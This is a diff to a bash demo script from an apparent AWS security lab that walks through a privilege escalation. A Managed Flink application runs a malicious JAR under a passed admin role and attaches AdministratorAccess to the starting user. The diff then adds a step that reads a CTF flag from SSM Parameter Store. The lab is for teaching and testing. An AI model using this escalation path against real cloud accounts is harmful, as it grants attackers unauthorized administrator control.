@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication privilege escalation
 # This scenario demonstrates how a user with PassRole, CreateApplication, and StartApplication permissions
@@ -109,6 +110,14 @@ use_readonly_creds() {
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
+
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
@@ -296,15 +305,14 @@ if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
 fi
 echo ""
 
-# Step 9: Verify admin access
+# [OBSERVATION]
+# Step 9: Verify privilege escalation success
 echo -e "${YELLOW}Step 9: Verifying privilege escalation success${NC}"
 
-# Wait for IAM propagation
+# Wait for IAM propagation after iam:AttachUserPolicy
 echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 
-# [OBSERVATION]
-# Check attached policies using readonly creds
 use_readonly_creds
 echo "Checking attached policies on starting user..."
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
@@ -313,23 +321,32 @@ echo "$ATTACHED_POLICIES"
 echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
 echo ""
 
-# Verify actual admin access
-echo "Attempting to list IAM users..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
-if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
-    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
+# [EXPLOIT]
+# Step 10: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/kinesisanalytics-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
 else
-    echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
 fi
 echo ""
 
 # Clean up temporary files
 rm -f /tmp/kinesisanalytics-001-app-config.json
 
-# Final summary
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, kinesisanalytics:CreateApplication, kinesisanalytics:StartApplication)"
@@ -338,12 +355,14 @@ echo "3. Created Managed Apache Flink application referencing malicious JAR in S
 echo "4. Started the application, passing $ADMIN_ROLE_NAME as the service execution role"
 echo "5. Flink app used admin role credentials to attach AdministratorAccess to starting user"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo "  $STARTING_USER"
-echo "  -> (kinesisanalytics:CreateApplication with S3 code) -> Flink app with malicious JAR"
-echo "  -> (iam:PassRole + kinesisanalytics:StartApplication with $ADMIN_ROLE_NAME)"
-echo "  -> Flink job calls iam:AttachUserPolicy -> Admin"
+echo -e "  $STARTING_USER"
+echo -e "  -> (kinesisanalytics:CreateApplication with S3 code) -> Flink app with malicious JAR"
+echo -e "  -> (iam:PassRole + kinesisanalytics:StartApplication with $ADMIN_ROLE_NAME)"
+echo -e "  -> Flink job calls iam:AttachUserPolicy -> Admin"
+echo -e "  -> (ssm:GetParameter) -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
